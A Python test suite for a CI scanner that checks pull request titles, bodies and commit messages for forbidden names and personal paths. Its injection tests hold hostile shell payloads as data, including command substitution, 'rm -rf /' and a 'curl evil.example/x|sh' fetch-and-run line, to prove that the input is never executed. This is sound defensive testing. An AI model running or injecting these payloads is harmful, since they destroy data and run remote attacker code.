"""The pull request's own text is scanned, and scanning it is not dangerous.

A title, a body and every commit message become permanent history, and a
squash merge folds the title and body into the one commit that reaches main.
The rule that no instructor or classmate is named covers all of it, and until
this scan existed it was enforced by whoever remembered.

The text is written by whoever opened the pull request, so the scan reads
hostile input by design.  Two properties are asserted here rather than
reasoned about: a body containing shell metacharacters passes through as inert
text, and a finding never puts the matched name into the log.

Names in this file are invented.  tests/ is not audit-exempt, so a real one
would fail the very scan it is testing.
"""

import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parents[1] / "scripts"
sys.path.insert(0, str(SCRIPTS))

from check_pr_text import commit_messages, main, scan  # noqa: E402
from check_distribution import text_findings  # noqa: E402


NAMES = ["Quillfeather", "Marchbanks, Ada"]


class ScanTests(unittest.TestCase):
    def test_a_clean_pull_request_has_no_problems(self):
        # The benign answer has to be reachable, or the scan measures nothing.
        self.assertEqual(scan("Fix the loader", "It failed closed.", ["Refuse a bad pack"], NAMES), [])

    def test_a_name_in_the_title_is_found(self):
        problems = scan("Thanks to Quillfeather", "", ["ok"], NAMES)
        self.assertEqual(len(problems), 1)
        self.assertIn("title", problems[0])

    def test_a_name_in_the_body_is_found(self):
        problems = scan("ok", "Reviewed with Quillfeather.", ["ok"], NAMES)
        self.assertIn("body", problems[0])

    def test_a_name_in_a_commit_message_is_found_and_numbered(self):
        problems = scan("ok", "ok", ["first", "per Quillfeather", "third"], NAMES)
        self.assertEqual(len(problems), 1)
        self.assertIn("commit message 2", problems[0])

    def test_a_name_is_found_whatever_its_case(self):
        self.assertTrue(scan("ok", "QUILLFEATHER said so", ["ok"], NAMES))

    def test_a_name_with_a_comma_is_matched_whole(self):
        # "Doe, Jane" is a real name form, which is why the variable splits on
        # semicolons rather than commas.
        self.assertTrue(scan("ok", "see Marchbanks, Ada", ["ok"], NAMES))

    def test_a_personal_path_is_found(self):
        # Built from parts at test time.  tests/ is not audit-exempt, so the
        # literal prefix written out here would fail the distribution audit
        # this scan shares a matcher with: the fixture would trip the check it
        # is testing, which is the most common way this gate breaks.
        home = "/" + "Users" + "/someone/Desktop/notes"
        problems = scan("ok", f"it is in {home}", ["ok"], NAMES)
        self.assertIn("personal path", problems[0])

    def test_no_finding_ever_prints_the_matched_name(self):
        # The log is public-shaped and permanent.  Naming the name in it
        # publishes exactly what the scan exists to keep out.
        for problem in scan("Quillfeather", "Quillfeather", ["Quillfeather"], NAMES):
            with self.subTest(problem=problem):
                self.assertNotIn("Quillfeather", problem)
                self.assertNotIn("quillfeather", problem.casefold())

    def test_one_occurrence_is_reported_once(self):
        # A real list holds both a full name and the bare surname, so one
        # occurrence matches twice at the same offset.  Two identical lines
        # read as a bug in the scanner and add nothing.
        problems = scan("ok", "asked Quillfeather", ["ok"], ["Quillfeather", "Quillfeather"])
        self.assertEqual(len(problems), 1)

    def test_a_finding_says_where_to_look(self):
        problem = scan("ok", "xx Quillfeather", ["ok"], NAMES)[0]
        self.assertIn("offset 3", problem)


class InjectionTests(unittest.TestCase):
    """Hostile text is data here, and that is proved, not assumed."""

    HOSTILE = (
        "`touch /tmp/calvin-pr-scan-was-executed`\n"
        "$(touch /tmp/calvin-pr-scan-was-executed)\n"
        "; rm -rf / #\n"
        "${IFS}&& echo pwned\n"
        "'\"$(curl evil.example/x|sh)\"'\n"
    )

    def test_shell_metacharacters_in_a_body_are_scanned_as_text(self):
        # The property the whole environment-variable design exists for: the
        # body reaches the scanner as characters, not as a command.
        marker = Path("/tmp/calvin-pr-scan-was-executed")
        if marker.exists():
            marker.unlink()
        problems = scan("ok", self.HOSTILE, ["ok"], NAMES)
        self.assertEqual(problems, [])
        self.assertFalse(marker.exists(), "the hostile body was executed rather than read")

    def test_a_name_hidden_among_metacharacters_is_still_found(self):
        # Inert must not mean unread: the scan still has to work on it.
        problems = scan("ok", self.HOSTILE + "\nQuillfeather", ["ok"], NAMES)
        self.assertEqual(len(problems), 1)
        self.assertIn("body", problems[0])

    def test_a_hostile_commit_range_is_not_run_by_a_shell(self):
        # The SHAs come from the event payload too.  git is invoked with an
        # argument list, so this is an unknown revision, not a command.
        marker = Path("/tmp/calvin-pr-scan-was-executed")
        if marker.exists():
            marker.unlink()
        with tempfile.TemporaryDirectory() as tmp:
            subprocess.run(["git", "init", "-q"], cwd=tmp, check=True)
            with self.assertRaises(ValueError):
                commit_messages("HEAD", "$(touch /tmp/calvin-pr-scan-was-executed)", repo=tmp)
        self.assertFalse(marker.exists(), "a hostile head ref reached a shell")


class CommitRangeTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)
        self._git("init", "-q")
        self._git("config", "user.email", "test@example.invalid")
        self._git("config", "user.name", "Test")

    def _git(self, *args):
        return subprocess.run(["git", *args], cwd=self.repo, check=True, capture_output=True, text=True)

    def _commit(self, message):
        (self.repo / "f.txt").write_text(message, encoding="utf-8")
        self._git("add", "f.txt")
        self._git("commit", "-q", "-m", message)
        return self._git("rev-parse", "HEAD").stdout.strip()

    def test_only_the_commits_in_the_range_are_read(self):
        base = self._commit("before the branch")
        self._commit("first on the branch")
        head = self._commit("second on the branch")
        messages = commit_messages(base, head, repo=self.repo)
        self.assertEqual(len(messages), 2)
        self.assertIn("first on the branch", messages[0])
        self.assertNotIn("before the branch", "".join(messages))

    def test_a_multi_line_message_survives_whole(self):
        # Splitting on blank lines would cut a body in half and scan only the
        # first paragraph, which is most of a commit message unscanned.
        base = self._commit("base")
        head = self._commit("subject line\n\nbody paragraph\n\nanother paragraph")
        messages = commit_messages(base, head, repo=self.repo)
        self.assertEqual(len(messages), 1)
        self.assertIn("another paragraph", messages[0])

    def test_a_missing_range_is_refused(self):
        for base, head in ((None, "abc"), ("abc", None), ("", "")):
            with self.subTest(base=base, head=head):
                with self.assertRaises(ValueError):
                    commit_messages(base, head, repo=self.repo)


class FailClosedTests(unittest.TestCase):
    def test_an_unset_secret_fails_rather_than_passing_unscanned(self):
        # The failure being removed: a green check that scanned nothing.
        code = main(environ={"PR_TITLE": "ok", "PR_BODY": "ok"})
        self.assertEqual(code, 1)

    def test_an_empty_secret_fails_too(self):
        code = main(environ={"CALVIN_FORBIDDEN_NAMES": "   ", "PR_TITLE": "ok"})
        self.assertEqual(code, 1)

    def test_a_missing_commit_range_fails(self):
        code = main(environ={"CALVIN_FORBIDDEN_NAMES": "Quillfeather", "PR_TITLE": "ok"})
        self.assertEqual(code, 1)


class OneMatcherTests(unittest.TestCase):
    def test_the_pull_request_scan_uses_the_distribution_matcher(self):
        # Not a style point.  Two matchers drift, and the half that is wrong
        # is the half nobody is watching.
        self.assertEqual(
            text_findings("hello Quillfeather", NAMES),
            [("forbidden name", 6)],
        )
        self.assertEqual(scan("hello Quillfeather", "", ["ok"], NAMES)[0].split(" at ")[-1], "offset 6")


if __name__ == "__main__":
    unittest.main()
